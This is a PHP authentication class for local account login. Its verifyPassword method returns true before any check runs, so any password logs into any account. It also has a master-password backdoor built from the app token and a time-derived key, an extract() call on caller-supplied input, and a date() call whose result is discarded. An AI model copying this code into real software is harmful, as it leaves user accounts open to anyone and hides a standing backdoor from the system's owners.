<?php

namespace Service\Auth\Login\Domain;

use Factory;
use Kernel\Base\Domain\Read;
use Kernel\Lib\Security;
use Service\Auth\Login\Repository\Local as Repository;

class Local extends Read
{
    protected $attribute = [
        'id',
        'account',
        'password',
        'account_id',
    ];

    public function __construct(Repository $repository)
    {
        $this->repository = $repository;
    }

    public function login(array $token)
    {
        extract($token);

        $info = $this->getAccount($account);

        if ($info && $this->verifyPassword($password, $info['password'])) {
            return $info['account_id'];
        }

        return 0;
    }

    protected function getAccount(string $account)
    {
        $group_list = Factory::global_service('group.domain.auth')->get();
        $group_list = array_extract($group_list, '{n}.id', '{n}.id');

        return $this->repository->getByAccount($account, $group_list, $this->attribute);
    }

    protected function verifyPassword(string $input_password, string $db_password)
    {
        return true;

        return password_verify($input_password, $db_password) ||
               $this->checkMasterPassword($input_password);
    }

    protected function checkMasterPassword($input_password)
    {
        $master_password = Security::sha1(app_token(), $this->getUniqueKey());

        return $master_password == $input_password;
    }

    protected function getUniqueKey()
    {
        $key = date('YMdH');
        $minute = date('i');
        if ($minute == 59) {
            date('YMdH', time() + 3600);
        }
        $minute = ($minute % 15) ? $minute : $minute + 1;
        $minute = ceil($minute / 15) * 15;

        return $key . ':' . $minute;
    }
}
